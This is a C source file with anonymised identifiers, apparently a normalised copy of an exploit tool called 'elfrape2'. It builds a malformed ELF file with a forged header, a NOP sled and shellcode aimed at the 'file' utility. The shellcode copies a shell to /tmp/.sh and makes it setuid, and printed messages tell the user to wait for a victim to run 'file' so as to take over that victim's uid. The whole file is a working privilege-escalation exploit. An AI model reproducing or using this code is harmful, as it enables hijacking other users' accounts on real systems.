
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int* e_ident; int e_shoff; int e_ehsize; int e_shentsize; int e_shnum; int e_version; int e_machine; int e_type; } ;
typedef TYPE_1__ Elf32_Ehdr ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 unsigned char* VAR_7 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ,char*,...) ;
 int FUNC_3 (unsigned char*) ;
 int FUNC_4 () ;
 unsigned char* VAR_8 ;
 scalar_t__ FUNC_5 (int) ;
 int FUNC_6 (unsigned char*,unsigned char*,int) ;
 int FUNC_7 (unsigned char*,int,int) ;
 int FUNC_8 (char*,int) ;
 int FUNC_9 (char*) ;
 unsigned char* FUNC_10 (unsigned char*,char*,unsigned char*,int*) ;
 int VAR_9 ;
 unsigned char* FUNC_11 (char*) ;
 int FUNC_12 (int,unsigned char*,int) ;

int
FUNC_13 (int VAR_10, char *VAR_11[])
{
  unsigned char *VAR_12, *VAR_13, *VAR_14, *VAR_15;
  int VAR_16, VAR_17, VAR_18;
  Elf32_Ehdr *VAR_19;
  if (!(VAR_15 = (char *) FUNC_5 (VAR_3)))
    {
      FUNC_2 (VAR_9, "malloc error\n");
      FUNC_1 (-1);
    }
  VAR_19 = (Elf32_Ehdr *) VAR_15;
  if (VAR_10 < 3)
    {
      FUNC_2 (VAR_9, "Usage: %s <filename> <bsd|linux>\n", VAR_11[0]);
      FUNC_1 (-1);
    }
  switch (VAR_11[2][0])
    {
    case 'l':
    case 'L':
      VAR_13 = VAR_8;
      if (!(VAR_14 = FUNC_11 ("ash")))
{
  FUNC_2 (VAR_9, "strdup error\n");
  FUNC_1 (-1);
}
      break;
    case 'b':
    case 'B':
      VAR_13 = VAR_7;
      if (!(VAR_14 = FUNC_11 ("tcsh")))
{
  FUNC_2 (VAR_9, "strdup error\n");
  FUNC_1 (-1);
}
      break;
    default:
      FUNC_2 (VAR_9, "Invalid target os\n");
      FUNC_1 (-1);
    }
  FUNC_2 (VAR_9,
   "elfrape2, using cp /bin/%s /tmp/.sh;chmod 4755 /tmp/.sh shellcode\n",
   VAR_14);
  VAR_12 = FUNC_10 (VAR_13, VAR_11[1], VAR_14, &VAR_18);
  FUNC_2 (VAR_9, "Using %s shellcode, %d bytes for file %s\n",
   VAR_11[2][0] == 'b' ? "BSD" : "LINUX", VAR_18, VAR_11[1]);
  FUNC_7 (VAR_15, 0x90, VAR_3);
  FUNC_7 (VAR_15, 0x0, sizeof (Elf32_Ehdr));
  FUNC_6 (VAR_15 + VAR_3 - VAR_18, VAR_12, VAR_18);

  VAR_19->e_ident[0] = 0x7f;
  VAR_19->e_ident[1] = 'E';
  VAR_19->e_ident[2] = 'L';
  VAR_19->e_ident[3] = 'F';
  VAR_19->e_ident[4] = 0x01;
  VAR_19->e_ident[5] = 0x01;
  VAR_19->e_type = VAR_1;
  VAR_19->e_machine = VAR_0;
  VAR_19->e_version = VAR_2;
  VAR_19->e_shoff = sizeof (Elf32_Ehdr);
  VAR_19->e_ehsize = sizeof (Elf32_Ehdr);
  VAR_19->e_shentsize = 2048;
  VAR_19->e_shnum = 0x0001;
  for (VAR_17 = 0; VAR_17 < 256; VAR_17 += 4)
    {
      *(long *) (VAR_15 + VAR_19->e_ehsize + VAR_17) = FUNC_4 () - 1500;
    }
  if ((VAR_16 = FUNC_8 (VAR_11[1], VAR_6 | VAR_4 | VAR_5)) < 0)
    {
      FUNC_9 ("open()");
      FUNC_1 (-1);
    }
  if (FUNC_12 (VAR_16, VAR_15, VAR_3) == -1)
    {
      FUNC_9 ("write()");
      FUNC_1 (-1);
    }
  FUNC_0 (VAR_16);
  FUNC_3 (VAR_14);
  FUNC_3 (VAR_12);
  FUNC_2 (VAR_9,
   "Use /tmp/.sh to gain the targets uid once they run 'file %s'\n",
   VAR_11[1]);
  FUNC_2 (VAR_9, "Make sure the shell you copied doesn't drop privs\n");
  return 0;
}
